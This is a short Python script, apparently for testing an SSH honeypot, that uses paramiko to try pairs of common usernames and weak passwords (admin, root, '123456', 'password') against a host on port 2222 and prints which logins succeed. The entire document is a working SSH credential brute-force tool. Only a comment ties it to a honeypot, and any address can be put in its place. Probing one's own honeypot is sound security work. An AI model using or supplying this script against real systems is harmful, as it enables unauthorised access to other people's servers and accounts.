import paramiko

# Honeypot IP address (replace with the actual IP address)
honeypot_ip = "192.168.1.10"  # Replace <honeypot_ip> with your honeypot IP
port = 2222

# Lists of usernames and passwords to try
usernames = ["admin", "root", "test"]
passwords = ["123456", "password", "admin"]

for username in usernames:
    for password in passwords:
        try:
            # Initialize the SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(honeypot_ip, port=port, username=username, password=password)
            
            # If connected, print success message
            print(f"[+] Success: {username}:{password}")
            ssh.close()
            break  # Exit loop if successful
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {username}:{password}")
        except Exception as e:
            print(f"[!] Error: {e}")
